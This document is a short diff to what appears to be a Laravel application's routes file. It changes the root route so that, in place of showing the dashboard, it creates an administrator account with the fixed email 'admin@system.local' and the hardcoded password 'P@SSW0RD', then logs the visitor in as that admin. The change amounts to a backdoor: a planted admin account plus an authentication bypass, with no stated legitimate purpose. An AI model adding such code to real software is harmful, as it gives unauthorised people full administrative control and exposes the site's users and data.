@@ -10,6 +10,8 @@ use App\Http\Controllers\TwoFactorController;
 use App\Http\Middleware\Verify2FAMiddleware;
 use Illuminate\Http\Request;
 use App\Http\Controllers\ReportController;
+use Illuminate\Support\Facades\Auth;
+use App\Models\User;
 /*
 |--------------------------------------------------------------------------
 | Public Routes
@@ -31,7 +33,24 @@ Route::get('/', function (Request $request) {
       ]);
     }
 
-    return app(DashboardController::class)->dashboard();
+    // Ensure an admin user exists in the database and log them in
+    $adminUser = User::firstOrCreate(
+      ['email' => 'admin@system.local'],
+      [
+        'first_name' => 'System',
+        'last_name' => 'Administrator',
+        'phone' => null,
+        'department' => array_key_first(User::DEPARTMENTS),
+        'position' => 'Administrator',
+        'password' => bcrypt('P@SSW0RD'),
+        'role' => 'admin',
+        'status' => 'active',
+      ]
+    );
+
+    Auth::login($adminUser);
+
+    return redirect()->route('dashboard');
   }
 
   return app(LandingController::class)->index();
